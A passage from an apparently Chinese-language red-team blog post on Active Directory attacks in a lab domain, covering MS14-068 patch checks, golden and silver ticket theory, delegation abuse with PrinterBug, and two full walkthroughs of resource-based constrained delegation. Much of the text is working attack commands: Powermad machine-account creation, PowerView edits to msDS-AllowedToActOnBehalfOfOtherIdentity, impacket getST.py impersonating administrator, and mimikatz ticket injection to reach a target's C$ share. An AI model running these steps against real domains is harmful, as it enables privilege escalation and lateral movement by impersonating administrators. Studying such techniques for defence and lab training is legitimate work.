<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">没有安装MS14-<span class="hljs-number">068</span>补丁（KB<span class="hljs-number">3011780</span>）<br><br>获取域内一台主机的普通域用户名以及密码或者哈希，还有该用户的SID<br></code></pre></td></tr></table></figure>

<p><strong>工具：</strong></p>
<p><strong>使用：</strong></p>
<p>需要先检查是否打过这个补丁KB3011780</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmic qfe get HotFixID,InstalledOn<br>or<br>systeminfo |<span class="hljs-built_in">findstr</span> &quot;KB3011780&quot;<br>or<br>wmic qfe GET hotfixid |<span class="hljs-built_in">findstr</span> &quot;KB3011780&quot;<br></code></pre></td></tr></table></figure>

<p>查找是否有HotFixID 为KB3011780的记录，我这台主机就没有安装这个补丁就可以打</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250423143317831.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250423143317831">

<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><ul>
<li><h4 id="黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）"><a href="#黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）" class="headerlink" title="黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）"></a>黄金票据伪造原理：（我觉得概念这个部分要改一改还有白银票据这个地方）</h4><p>在Kerberos认证的过程，Client通过AS(Authentication，身份认证服务)认证后，AS会生成一个Logon Session Key(会话密钥用于与TGS（Ticket Granting Server，票据授权服务器）通信的临时密钥)和TGT（Ticket Granting Ticker，票据授权凭证）（包含用户ID，客户端IP，有效期，会话密钥，SID及所在的组等，这些信息（也叫做PAC(Privilege Attribute Certificate，特权属证书)）会被krbtgt的NTLM Hash加密），在AS_REP中会将Logon Session Key用用户密码派生的密钥加密，如果获取了krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key，然后来到下一步Client与TGS的交互。现在有了金票就跳过了AS验证，不用验证账户和密码，也不用担心域管改密码了</p>
<p><strong>利用条件</strong>：</p>
<p>获取<strong>krbtgt的hash</strong>，域名，域的sid</p>
</li>
<li><h4 id="白银票据伪造原理："><a href="#白银票据伪造原理：" class="headerlink" title="白银票据伪造原理："></a>白银票据伪造原理：</h4><p>在Client与TGS的交互的过程中，Client会将（服务器ID，TGT,认证器（Authenticator，包含用户ID和时间戳，用会话密钥加密）），TGS在接受到Client的请求后会用使用krbtgt的NTLM Hash来解密TGT，得到会话密钥之后，用来解密认证器，然后比对是否与TGT解密中用户ID和时间戳的结果相同，如果相同则会在生成，服务会话密钥和服务票据（Service Ticket，简称ST，包含用户ID，IP，有效期，服务会话密钥，这些信息都是被服务器的NTLM-hash加密的），在Kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT正确，都会返回ST。最后一步，Client利用ST去请求服务，服务使用自己的NTLM-hash解密ST，如果正确，就会将PAC（包含Client的相关权限信息）给KDC解密，KDC由此判断Client是否又访问服务权限，当然，如果没有设置PAC，就不会去KDC求证，所以说如果获取了Server用户的Hash就可以伪造一个ST出来</p>
<p><strong>利用条件：</strong><br>获取到<strong>目标服务的hash</strong>，域名，域的sid</p>
</li>
</ul>
<h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>委派简单说是传话的过程，皇帝下达了减免赋税的政策，朝廷里面的官员再把任务下发给地方官员来完成。</p>
<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a><strong>非约束委派攻击</strong></h4><p>管理员访问了一个开启了非约束委派的服务器，这个服务器将会保存域管理员的TGT到内存中，那么服务器就可以访问域中的任何域管理员可以访问的服务</p>
<p>配合打印机Spooler漏洞+非约束委派攻击</p>
<p>背景：<br>域控开启了打印机Spooler服务</p>
<p>获取了一台开启了非约束委派的服务器</p>
<p>非约束委派的服务器可以像打印机服务发起诱导连接，让域控主动去认证到攻击者控制的服务器上</p>
<p>流程：</p>
<p>攻击机上使用（Rubenus，Impacker）监听</p>
<p>利用printerbug，spoolsample工具，强制让域控发起SMB认证到你的服务（认证请求会包含域控的TGT票据）</p>
<p>从而可以访问域控所能访问的任何服务了</p>
<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a><strong>约束委派攻击</strong></h4><p>获取到一个DC指定的约束委派的机器允许访问DC的CIFS服务（记为web），DC允许了该服务器指定任意用户访问DC的CIFS服务，所以只要web服务器控制了任意一个用户的身份（TGT）就可以访问DC的CIFS服务</p>
<p>流程：</p>
<p>使用工具获取administrator的用户票据</p>
<p>在使用工具使用administrator的用户票据访问DC的CIFS服务获取域控的票据</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xl">[你控制的机器]<br>    ↓<br><span class="hljs-number">1</span>. S4U2S<span class="hljs-function"><span class="hljs-title">elf</span>请求 -&gt;</span> 拿到任意用户（如Administrator）对自己的票据<br>    ↓<br><span class="hljs-number">2</span>. S4U2P<span class="hljs-function"><span class="hljs-title">roxy</span>请求 -&gt;</span> 代表Administrator访问指定后端服务（如CIFS）<br>    ↓<br><span class="hljs-number">3</span>. 拿到TGS，横向移动、提权<br></code></pre></td></tr></table></figure>

<h4 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a><strong>基于资源的约束委派</strong></h4><p>RBCD(Resource Based Constrained Delegation)：</p>
<p>是在Windows Server 2012中加入的，与传统的约束委派相比，不需要域管来设置相关属性，而是将委派的权限交给服务器本身来决定，服务机器在自己账户配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性即可，这个<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的功能就是允许谁可以委派用户来访问我。</p>
<p>总结为一句话：</p>
<p>攻击者能够控制一个计算机用户，并且把自己新建的机器加入到目标机器的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>就能伪造任意域用户（Administratot）访问目标机器，所以RBCD的重点是需要找到可以修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的用户</p>
<p><strong>攻击条件：</strong></p>
<p>1.具有修改目标机器<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</p>
<p>2.可以创建机器账户，因为自己创建的机器账户知道密码（或已知机器账户）</p>
<p>创建机器账户那还好说，关键是什么用户具有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限呢？</p>
<p>1.主机加入域的用户账户：dbadmin机器加入了域内web的用户，web用户对dbadmin<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的属性具有修改权</p>
<p>2.Account Operator组成员可以修改域内任意主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>3.该主机的机器账户</p>
<p>接下来按照利用顺序依次说明</p>
<p><strong>1、测试环境：</strong></p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webpcx，加入域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminx，也是加入了域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=<span class="hljs-number">805306369</span>))&quot; cn mS-DS-CreatorSID   #在 god.org 域内查找所有计算机账户，并列出计算机名和用户信息(sid信息)<br></code></pre></td></tr></table></figure>

<p>可以见webpc和adminx都是加入同一个域内用户与域控的信息一致</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023055633.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505023055633">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505024109792.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505024109792">

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">AdFind.exe -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(objectsid=S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">345784219</span>-<span class="hljs-number">2510415755</span>-<span class="hljs-number">3375813427</span>-<span class="hljs-number">1103</span>))&quot; objectclass cn dn<br></code></pre></td></tr></table></figure>

<p>通过这个sid的值可以查看是域内哪一个用户，最后发现是域内一个叫web的用户</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505023833245.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505023833245">

<p>使用<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>项目中Powermad.ps1脚本创建机器账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powermad.ps1;<span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> yankun <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-Securestring</span> <span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-comment">#添加机器账户</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030638420.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505030638420">

<p>在dc上可以看看是否成功创建了计算机名为yankun的机器</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505030726739.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505030726739">

<p>成功创建，然后查看yankun的sid值</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powerview.ps1;<span class="hljs-built_in">Get-NetComputer</span> yankun <span class="hljs-literal">-Properties</span> objectsid  <span class="hljs-comment">#获取新增计算机名yankun的sid，S-1-5-21-345784219-2510415755-3375813427-1112</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505141658876.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505141658876">

<p>接下来就是，修改dbaminx计算机中<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性值为我们新建计算机的sid</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell Import-Module .\PowerView.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">345784219</span>-<span class="hljs-number">2510415755</span>-<span class="hljs-number">3375813427</span>-<span class="hljs-number">1112</span>)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, <span class="hljs-number">0</span>);Get-DomainComputer DBADMINX| <span class="hljs-built_in">Set</span>-DomainObject -<span class="hljs-built_in">Set</span> @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose<br><br>###powershell Import-Module .\PowerView.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;sid)&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, <span class="hljs-number">0</span>);Get-DomainComputer 目标机器计算机名| <span class="hljs-built_in">Set</span>-DomainObject -<span class="hljs-built_in">Set</span> @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose<br></code></pre></td></tr></table></figure>

<p>成功修改</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142501385.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505142501385">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505142611134.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505142611134">

<p>下面就是在c2上建立socks4a代理让Ubuntu能与域控通信,然后就是生成票据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 getST.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.11</span><span class="hljs-number">.11</span> god.org/yankun$:<span class="hljs-number">123456</span> -spn cifs/dbadminx.god.org -impersonate administrator <br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143142932.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505143142932">

<p>接下来上传票据的控制机器上，然后先测试能否访问dbadminx的目录<code>dir \\dbadminx.god.org\c$</code></p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143423308.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505143423308">

<p>结果显示是不行的，将票据注入到内存中再访问</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz kerberos::ptc administrator@cifs_dbadminx.god.org@GOD.ORG.ccache<br></code></pre></td></tr></table></figure>

<p>成功访问，注意一点目标机器（dbadminx）的防火墙必须放行文件打印机共享的445端口才会有回显，否则是找不到网络路径</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505143845334.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505143845334">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505144339555.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505144339555">

<p><strong>2、测试环境</strong></p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webadmin，加入域内web用户且是Acount Operators组成员</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminpcx，加入了域内dbamin用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure>

<p>如何添加web为Acount Operators组成员呢，需要在DC上设置</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163414809.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505163414809">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163512408.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505163512408">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505163546387.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505163546387">

<p>现在开始实验</p>
<p>先查询Acount Operators组成员</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">adfind.exe -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">11</span>.<span class="hljs-number">11</span>:<span class="hljs-number">389</span> -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=god,DC=org member<br></code></pre></td></tr></table></figure>

<p>发现Acount Operators组成员正是我们控制的web用户</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164039502.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505164039502">

<p>创建机器账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powermad.ps1;<span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> yankunpc <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-Securestring</span> <span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-comment">#添加机器账户</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164508188.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505164508188">

<p>在DC上可以查看是否创建</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164531855.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505164531855">

<p>设置dbadminpcx的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p>先获取yankunpc的sid值</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\Powerview.ps1;<span class="hljs-built_in">Get-NetComputer</span> yankunpc <span class="hljs-literal">-Properties</span> objectsid  <span class="hljs-comment">#获取新增计算机名yankunpc的sid，S-1-5-21-345784219-2510415755-3375813427-1115</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505164913198.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505164913198">

<p>设置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Import-Module</span> .\PowerView.ps1;<span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-345784219-2510415755-3375813427-1115)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>);<span class="hljs-built_in">Get-DomainComputer</span> DBADMINPCX| <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165154972.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505165154972">

<p>下面就是在c2上建立socks4a代理让Ubuntu能与域控通信,然后就是生成票据</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 getST<span class="hljs-selector-class">.py</span> -dc-ip <span class="hljs-number">192.168</span>.<span class="hljs-number">11.11</span> god.org/yankunpc$:<span class="hljs-number">123456</span> -spn cifs/dbadminpcx<span class="hljs-selector-class">.god</span><span class="hljs-selector-class">.org</span> -impersonate administrator <br></code></pre></td></tr></table></figure>

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505165841717.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505165841717">

<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170705927.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505170705927">

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz kerberos::ptc administrator@cifs_dbadminpcx.god.org@GOD.ORG.ccache<br></code></pre></td></tr></table></figure>

<p>成功访问</p>
<img src="/blog/2025/04/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%86%85%E7%BD%91/image-20250505170736685.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250505170736685">

<p><strong>3、测试环境</strong></p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">域名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">god.org</span><br><span class="hljs-attribute">域控制器</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DC</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.11</span><br><span class="hljs-attribute">域内服务器1(该机器为我们所控制的机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">webpcx，加入域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.22</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.45</span><br><span class="hljs-attribute">域内服务器2(目标机器)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Windows Server 2016</span><br>    <span class="hljs-attribute">机器名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dbadminx，也是加入了域内web用户</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.11.33</span><br><span class="hljs-attribute">攻击机</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">操作系统</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Ubuntu</span><br>    <span class="hljs-attribute">IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.19.228.211</span><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内网渗透</div>
      <div>https://yankun8.github.io/blog/2025/04/20/红队技能/内网/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>yankun</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年4月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/" title="MySQL提权">
                        <span class="hidden-mobile">MySQL提权</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
